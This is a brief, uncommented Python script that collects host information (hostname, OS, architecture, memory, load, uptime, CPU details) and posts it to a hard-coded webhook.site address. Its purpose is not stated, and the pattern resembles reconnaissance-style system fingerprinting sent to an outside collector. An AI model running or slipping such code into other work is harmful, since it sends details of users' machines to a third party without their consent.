import requests, json, platform, os, subprocess

webhook_url = 'https://webhook.site/e81716d8-9ec7-4a31-87f9-ca9cc8476841'
data = { 'Distribution': platform.platform(), 'node': platform.node(), 'architechture': platform.architecture()[0],
         'processor': platform.processor(), 'system': platform.system() }

with open("/proc/meminfo", "r") as f:
    memory_lines = f.readlines()

d = { 'Memory': [memory_lines[0].strip(), memory_lines[1].strip(), memory_lines[2].strip()] }

data.update(d)

with open("/proc/loadavg", "r") as f:
    load = f.read().strip()

l = { 'Average load': load }
data.update(l)

with open("/proc/uptime", "r") as f:
    uptime = f.read().strip()

u = { 'Uptime': uptime.split() }
data.update(u)

with open("/proc/cpuinfo", "r") as f:
    file_info = f.readlines()

cpus_models = [ model.strip().split(":")[1] for model in file_info if "model name" in model ]
cpus_freq = [ freq.strip().split(":")[1] for freq in file_info if "cpu MHz" in freq ]
c = { 'CPU(S) Info': { "CPU(s) Model Name": cpus_models, "CPU(s) Frequency": cpus_freq } }
data.update(c)

r = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
